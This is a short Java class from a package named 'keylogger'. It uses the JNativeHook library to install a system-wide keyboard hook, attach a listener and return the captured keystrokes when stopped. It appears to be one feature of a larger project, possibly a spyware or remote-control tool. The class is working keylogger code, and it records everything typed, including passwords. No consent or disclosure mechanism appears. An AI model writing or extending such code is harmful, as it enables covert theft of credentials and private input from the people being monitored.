package com.example.project.features.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class KeyLog {
    KeyListener KL;

    public void start(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
        KL = new KeyListener();
        GlobalScreen.addNativeKeyListener(KL);
    }
    public String end(){
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
        return KL.getText();
    }
}
